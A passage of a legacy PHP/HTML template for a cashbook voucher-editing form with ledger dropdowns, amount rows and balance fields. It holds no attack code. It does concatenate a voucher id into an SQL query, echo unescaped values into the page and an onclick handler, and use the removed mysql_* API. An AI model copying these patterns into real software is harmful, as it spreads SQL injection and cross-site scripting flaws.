									<td width="150px">&nbsp;<input type="hidden" name="startYear" id="startYear" value="<?php echo date("d-m-Y",strtotime($_SESSION['cashbook_syr']));?>"/><input type="hidden" name="endYear" id="endYear" value="<?php echo date("d-m-Y",strtotime($_SESSION['cashbook_eyr']));?>"/><input type="hidden" name="minDate" id="minDate" value="<?php echo $minimum_date; ?>"/><input type="hidden" name="maxDate" id="maxDate" value="<?php echo date("d-m-Y"); ?>"/></td>
									<td width="50px"><b style="font-size:14px;color:#FFFFFF;">Date&nbsp;:&nbsp;</b></td>
									<td width="120px"><input name="Paydate" id="Paydate" maxlength="10" readonly="true" class="styleInput1" value="<?php echo date("d-m-Y", strtotime($res1['vouch_date'])); ?>" onchange="get_cash_balance(document.getElementById('cihName').value)" style="background-color:#C5F8B8;"/></td>
								</tr>
								<tr height="10px" width="770px">
									<td width="12px">&nbsp;<?php echo '<select name="expHead" id="expHead" style="width:230px; height:20px; display:none;">
									<option value="0">--Select--</option>';
									$sqlLedger=mysql_db_query(DATABASE2,"SELECT * FROM ledger ORDER BY ledger_name") or die(mysql_error());
									while($resLedger=mysql_fetch_array($sqlLedger)){
										echo '<option value="'.$resLedger['ledger_id'].'">'.$resLedger['ledger_name'].'</option>';
									}
									echo '</select>';?></td>
									<td width="90px"><b style="font-size:14px;color:#FFFFFF;">Dr. A/C&nbsp;:&nbsp;</b></td>
									<?php if($_SESSION['cashbook_utype']=="A" || $_SESSION['cashbook_utype']=="S"){
										echo '<td width="230px"><input name="cih" id="cih" size="34" readonly="true" value="'.$res1['cih_name'].'" style="background-color:#C5F8B8;"/><input type="hidden" name="cihName" id="cihName" value="'.$res1['cih_id'].'"/></td>';
									} elseif($_SESSION['cashbook_utype']=="U"){
										echo '<td width="230px"><input name="cih" id="cih" size="34" readonly="true" value="'.$_SESSION['cashbook_cihname'].'" style="background-color:#C5F8B8;"><input type="hidden" name="cihName" id="cihName" value="'.$_SESSION['cashbook_cihid'].'"/></td>';
									} ?>
									<td width="150px">&nbsp;<input type="hidden" name="currentBalance" id="currentBalance" value="<?php echo $current_balance; ?>"></td>
									<td width="50px"><b style="font-size:14px;color:#FFFFFF;">Balance&nbsp;:&nbsp;</b></td>
									<td width="120px" id="tdBal"><?php if($current_balance>=0){
									echo '<input name="Balance" id="Balance" readonly="true" value="'.$balance.'" class="styleInput1" style="background-color:#C5F8B8; color:#FF0000;">';
									} else {
									echo '<input name="Balance" id="Balance" readonly="true" value="'.$balance.'" class="styleInput1" style="background-color:#C5F8B8; color:#000000;">';
									} ?>
									</td>
								</tr>
								<?php 
								$i = 0;
								$remark = "";
								$total_amount = 0;
								$sql1=mysql_db_query(DATABASE2,"SELECT tblcash1.*,tblcash2.* FROM tblcash1 INNER JOIN tblcash2 ON tblcash1.vouch_id = tblcash2.vouch_id WHERE tblcash1.vouch_id=".$vid." ORDER BY seq_no") or die(mysql_error());
								$count = mysql_num_rows($sql1);
								while($res1=mysql_fetch_array($sql1)){
									$remark = $res1['remark'];
									echo '<tr id="trRow['.$i.']" height="10px" width="770px">
									<td width="12px" id="tdColA['.$i.']"><a onclick="hide_row('.$i.')"><img src="images/shrink.gif" style="display:inline; cursor:hand;" border="0" /></a></td>
									<td width="90px" id="tdColB['.$i.']"><b style="font-size:14px;color:#FFFFFF;">Cr. A/C&nbsp;:&nbsp;</b></td>
									<td width="230px" id="tdColC['.$i.']">';
									echo '<select name="exp_head_'.$i.'" id="exp_head_'.$i.'" style="width:230px; height:20px;">
									<option value="0">--Select--</option>';
									$sqlLedger=mysql_db_query(DATABASE2,"SELECT * FROM ledger ORDER BY ledger_name") or die(mysql_error());
									while($resLedger=mysql_fetch_array($sqlLedger)){
										if($resLedger['ledger_id']==$res1['exps_id'])
											echo '<option selected value="'.$resLedger['ledger_id'].'">'.$resLedger['ledger_name'].'</option>';
										else
											echo '<option value="'.$resLedger['ledger_id'].'">'.$resLedger['ledger_name'].'</option>';
									}
									echo '</select></td>
									<td width="150px" id="tdColD['.$i.']">&nbsp;<input type="hidden" name="hideT'.$i.'" id="hideT'.$i.'" value="P"/></td>
									<td width="50px" id="tdColE['.$i.']"><b style="font-size:14px;color:#FFFFFF;">Amount&nbsp;:&nbsp;</b></td>
									<td width="120px" id="tdColF['.$i.']"><input name="Amt'.$i.'" id="Amt'.$i.'" value="'.$res1['exps_amt'].'" class="styleInput1" onkeyup="return check_value(this.value);"></td>
									</tr>';
									$total_amount += $res1['exps_amt'];
									$i++;
								}
								
								//now fill up rest of the rows (i.e. upto 99) as default and hide them
								for($i=$count; $i<=99; $i++){
									if($i==$count){
										echo '<tr id="trRow['.$i.']" height="10px" width="770px">';
										echo '<td width="12px" id="tdColA['.$i.']" width="8px"><a onclick="show_row('.$i.')"><img src="images/expand.gif" style="display:inline; cursor:hand;" border="0" /></a></td>';
									} else {
										echo '<tr id="trRow['.$i.']" height="10px" width="770px" style="display:none;">';
										echo '<td width="12px" id="tdColA['.$i.']" style="display:none;"><a onclick="show_row('.$i.')"><img src="images/expand.gif" style="display:inline; cursor:hand;" border="0" /></a></td>';
									}
								
								echo '<td width="90px" id="tdColB['.$i.']" style="display:none;"><b style="font-size:14px;color:#FFFFFF;">Cr. A/C&nbsp;:&nbsp;</b></td>
								<td width="230px" id="tdColC['.$i.']" style="display:none;"><select name="exp_head_'.$i.'" id="exp_head_'.$i.'" style="width:230px; height:20px;"><option value="0">--Select--</option></select></td>
								<td width="150px" id="tdColD['.$i.']" style="display:none;">&nbsp;<input type="hidden" name="hideT'.$i.'" id="hideT'.$i.'" value="D"/></td>
								<td width="50px" id="tdColE['.$i.']" style="display:none;"><b style="font-size:14px;color:#FFFFFF;">Amount&nbsp;:&nbsp;</b></td>
								<td width="120px" id="tdColF['.$i.']" style="display:none;"><input name="Amt'.$i.'" id="Amt'.$i.'" value="0" class="styleInput1" onkeyup="return check_value(this.value);"></td>
								</tr>';
								}?>
								<tr height="10px" width="770px">
									<td width="12px"></td>
									<td width="90px"><b style="font-size:14px;color:#FFFFFF;">Narration&nbsp;:&nbsp;</b></td>
									<td width="230px"><textarea name="remark" cols="26" rows="4"><?php echo $remark; ?></textarea></td>
									<td width="150px">&nbsp;</td>
									<td width="50px"><b style="font-size:14px;color:#FFFFFF;">Total&nbsp;:&nbsp;</b></td>
									<td width="120px"><input name="TotalAmt" id="TotalAmt" value="<?php echo number_format($total_amount,2,".",""); ?>" readonly="true" class="styleInput1" style="background-color:#C5F8B8;"></td>
								</tr>
								</table>
							</td>
						</tr>
						</table>
					</td>
				</tr>
				<tr>
					<?php $page = "lstcashbook.php?lid=".$lid."&dt1=".$dt1."&dt2=".$dt2;
					if(isset($_REQUEST['pg'])){$page .= "&pg=".$pg."&tr=".$tr;}?>
					<td align="right" height="35px"><b style="font-size:14px;color:#FFFFFF;">Available Balance&nbsp;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</b><span id="avlBalSpan"><?php if($current_balance>=0){echo '<input name="availBalance" id="availBalance" readonly="true" value="'.$balance.'" class="styleInput1" style="background-color:#C5F8B8; color:#FF0000;">';} else {echo '<input name="availBalance" id="availBalance" readonly="true" value="'.$balance.'" class="styleInput1" style="background-color:#C5F8B8; color:#000000;">';}?></span><?php echo str_repeat("&nbsp;",28); ?><input type="submit" name="submit" value="Submit" style="width:80px;">&nbsp;&nbsp;<input type="button" value="Refresh" style="width:80px;" onclick="reset()">&nbsp;&nbsp;<input type="submit" name="submit" value="ChangeToPayment">&nbsp;&nbsp;<input type="button" value="Exit" style="width:80px;" onclick="window.location='<?php echo $page;?>'">
					</td>
				</tr>
				</table>
			</td>
		</tr>
		</table>
	</td>
</tr>
</table>
</form>
</body>
</html>